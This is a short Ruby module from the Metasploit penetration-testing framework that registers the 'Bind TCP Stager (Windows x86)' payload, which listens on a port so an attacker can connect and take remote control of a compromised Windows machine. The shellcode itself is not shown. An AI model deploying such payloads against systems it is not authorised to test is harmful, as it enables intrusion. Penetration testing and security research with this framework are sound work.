##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/windows/bind_tcp'

module MetasploitModule

  CachedSize = 285

  include Msf::Payload::Stager
  include Msf::Payload::Windows::BindTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Bind TCP Stager (Windows x86)',
      'Description' => 'Listen for a connection (Windows x86)',
      'Author'      => ['hdm', 'skape', 'sf'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::BindTcp,
      'Convention'  => 'sockedi',
      'Stager'      => { 'RequiresMidstager' => false }
    ))
  end
end
